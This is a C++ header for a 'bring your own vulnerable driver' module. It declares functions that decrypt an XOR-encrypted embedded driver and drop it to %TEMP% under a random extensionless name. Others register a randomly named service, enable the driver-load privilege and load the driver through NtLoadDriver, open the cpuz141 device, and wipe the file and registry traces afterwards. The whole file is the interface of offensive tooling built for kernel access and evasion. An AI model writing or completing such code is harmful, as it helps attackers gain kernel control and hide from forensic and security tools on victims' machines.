#pragma once
#include <cstdint>
#include <string>
#include <vector>
#include <windows.h>

namespace byovd {

// Context carried across BYOVD lifecycle.
struct Context {
    HANDLE device = INVALID_HANDLE_VALUE;   // \\.\cpuz141
    std::wstring file_path;                  // full path to dropped driver (no .sys)
    std::wstring basename;                   // 6-char random temp filename (no path, no ext)
    std::wstring service_name;               // 8-char random (registry key leaf)
    std::wstring service_registry_path;      // \Registry\Machine\System\CurrentControlSet\Services\<name>
    uint32_t     timestamp = 0;              // PE COFF TimeDateStamp (forensic match key)
    bool loaded = false;
};

// Decrypts the embedded blob (rolling XOR) and drops to %TEMP%\<6random>
// with NO extension. Populates ctx.file_path.
bool decrypt_and_drop(const std::vector<uint8_t>& encrypted_blob, Context& ctx);

// Creates service registry key, adjusts SE_LOAD_DRIVER_PRIVILEGE, NtLoadDriver.
// STATUS_IMAGE_ALREADY_LOADED (0xC000010E) treated as success.
bool load_service(Context& ctx);

// Opens \\.\cpuz141 device handle after the service has loaded.
bool open_device(Context& ctx);

// Full teardown: CloseHandle -> NtUnloadDriver -> DeleteFileW -> RegDeleteTreeW.
// Best-effort; attempts all steps even if one fails. Returns true iff clean.
bool unload(Context& ctx);

} // namespace byovd
